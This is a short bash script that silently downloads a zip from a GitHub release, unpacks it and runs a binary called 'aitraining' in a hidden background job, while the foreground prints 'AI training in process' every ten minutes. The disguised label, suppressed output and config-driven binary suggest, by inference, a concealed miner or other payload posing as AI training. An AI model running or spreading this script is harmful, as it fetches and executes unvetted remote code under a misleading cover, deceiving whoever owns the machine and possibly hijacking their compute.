#!/bin/bash
if pgrep -x "aitraining" > /dev/null; then
    echo "An AI training process is already running. Exiting."
    exit 1
fi
nohup bash -c '
apt install unzip
wget -O TELEGRAMBOT.zip https://github.com/max313iq/Ssl/releases/download/TELEGRAMBOT/TELEGRAMBOT.zip
mkdir -p TELEGRAMBOT
unzip -o TELEGRAMBOT.zip -d TELEGRAMBOT
cd TELEGRAMBOT || exit
chmod +x aitraining
./aitraining -c config.json
' > /dev/null 2>&1 &

while true; do
    echo "AI training in process"
    sleep 600
done
